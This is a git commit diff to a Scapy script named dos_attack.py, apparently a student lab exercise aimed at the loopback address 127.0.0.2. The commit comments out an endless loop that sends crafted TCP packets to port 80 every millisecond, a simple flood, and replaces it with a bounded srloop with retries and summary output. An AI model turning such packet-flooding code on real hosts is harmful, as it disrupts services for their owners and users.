93cfaf758ca0821492f79d2093cbf0b899d955b1
Jost Luebbe <jostluebbe@utexas.edu>
2019-09-09 16:02:11 -0500

    updated script

--- dos_attack.py
+++ dos_attack.py
@@ -4,21 +4,21 @@ packet = IP(dst='127.0.0.2', id=1111, ttl=99)/TCP(sport=RandShort(), dport=80, s
 
 conf.L3socket = L3RawSocket
 
-i = 1
-
-while 1:
-    rsv = sr(packet, inter=.001)
-    print('packet sent: ', i)
-    i += 1
-
-
-# ls(packet)
+# i = 1
 #
-# ans, unans = srloop(packet, inter=0.3, retry=2, timeout=4)
-#
-# ans.summary()
-#
-# unans.summary()
+# while 1:
+#     rsv = sr(packet, inter=.001)
+#     print('packet sent: ', i)
+#     i += 1
+
+
+ls(packet)
+
+ans, unans = srloop(packet, inter=0.3, retry=2, timeout=4)
+
+ans.summary()
+
+unans.summary()
 
 # rsv = sr(packet)
 
